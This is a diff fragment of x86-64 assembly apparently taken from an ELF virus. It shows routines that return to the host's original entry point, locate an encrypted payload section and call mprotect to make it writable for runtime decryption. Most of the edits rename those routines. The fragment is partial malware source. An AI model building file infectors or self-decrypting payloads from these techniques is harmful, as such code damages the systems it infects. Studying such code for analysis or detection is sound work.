@@ -55,7 +55,7 @@ _ret2oep:
     add rax, 0x77777777 ; old entry_point
     ret
 
-_ret2textsection:
+_ret2encryptedsection:
     call _get_rip
     sub rax, 0x66666666 ; virus size without ret2oep
     sub rax, 0x66666666 ; new_entry_point
@@ -63,8 +63,8 @@ _ret2textsection:
     ret
 
 _mprotect:
-    call _ret2textsection
-    call _settextoffset
+    call _ret2encryptedsection
+    call _retencryptedsectionsize
     mov rdi,  rax
     and rdi, -0x1000
     mov rax, 0xa
@@ -73,13 +73,13 @@ _mprotect:
     syscall
     ret
 
-_settextoffset:
+_retencryptedsectionsize:
     mov r14, 0x55555555
     ret
 
 _getvar:
-    call _ret2textsection
-    call _settextoffset
+    call _ret2encryptedsection
+    call _retencryptedsectionsize
     mov rdi, rax
     mov rsi, r14
     mov rcx, [rel $+key_len-$]
